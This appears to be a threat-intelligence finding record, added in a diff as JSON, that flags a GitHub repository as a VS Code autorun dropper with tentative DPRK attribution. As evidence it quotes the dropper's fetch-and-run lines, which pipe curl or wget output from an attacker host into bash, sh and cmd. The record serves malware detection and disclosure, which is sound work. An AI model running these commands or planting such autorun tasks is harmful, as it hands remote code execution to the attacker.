@@ -1,0 +1,61 @@
+{
+  "finding": {
+    "key": "repository:chainfliplabs141/chainfliplabs-platform",
+    "kind": "repository",
+    "family": "",
+    "id": "chainfliplabs141/chainfliplabs-platform",
+    "url": "https://github.com/ChainFlipLabs141/ChainFlipLabs-Platform",
+    "registry": "github",
+    "owner": "chainfliplabs141",
+    "status": "confirmed",
+    "confidence": "",
+    "score": 5,
+    "detection_method": "osm_repository",
+    "attribution": "dprk (north korea)",
+    "campaign_id": "",
+    "rules": "install_hook/vscode-autorun",
+    "evidence_locations": ".vscode/tasks.json:0",
+    "c2_hosts": "chainflip.s.gy",
+    "iocs": "chainflip.s.gy; https://chainflip.s.gy/M; https://chainflip.s.gy/L; https://chainflip.s.gy/W; curl -L 'https://chainflip.s.gy/M' | bash; .vscode/tasks.json",
+    "matched_signatures": "",
+    "reasons": "OSM-flagged malicious repository (severity CRITICAL) [DPRK (North Korea) (per OSM)]: Malicious vscode tasks.json file that delivers malware when the repository is opened in visual studio code as trusted workspace. | Tier-2 confirmed (bash score 5)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20260707T021635Z",
+    "last_seen": "hunt-20260707T021635Z",
+    "evidence_file": "repositories/chainfliplabs141_chainfliplabs-platform.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": ".vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl -L 'https://chainflip.s.gy/M' | bash wget -qO- 'https://chainflip.s.gy/L' | sh curl --ssl-no-revoke -L https://chainflip.s.gy/W | cmd"
+    }
+  ],
+  "commit_sha": null,
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/chainfliplabs141/chainfliplabs-platform",
+    "version_info": "all",
+    "threat_description": "VS Code autorun dropper. Payload in .vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from chainflip.s.gy and executes it (.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: chainflip.s.gy.\nAttribution: the tradecraft is consistent with North Korea, but a single signal is a lead rather than an attribution, so we do not attribute it on this evidence alone. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun; Corroboration (not counted toward attribution): OSM/news already names dprk (north korea).\nConfirmed by static analysis; the code was read, never executed.",
+    "payload_description": "Malicious payload found in: .vscode/tasks.json\n- Outbound: fetch-and-run. It downloads code from chainflip.s.gy and executes it (.vscode/tasks.json).\n- .vscode/tasks.json: VS Code task with runOn: folderOpen; runs the moment the folder is opened, no install or click needed\n- Attacker hosts: chainflip.s.gy",
+    "publisher": "chainfliplabs141",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "dprk-consistent-tradecraft",
+      "vscode-folderopen-autorun",
+      "dropper"
+    ],
+    "evidence_references": "https://github.com/chainfliplabs141/chainfliplabs-platform/blob/HEAD/.vscode/tasks.json",
+    "verified_iocs": "chainflip.s.gy\nhttps://chainflip.s.gy/M\nhttps://chainflip.s.gy/L\nhttps://chainflip.s.gy/W\ncurl -L 'https://chainflip.s.gy/M' | bash\n.vscode/tasks.json",
+    "contributors": [],
+    "first_seen": "2026-07-07T02:16:35Z",
+    "last_seen": "2026-07-07T02:16:35Z"
+  }
+}
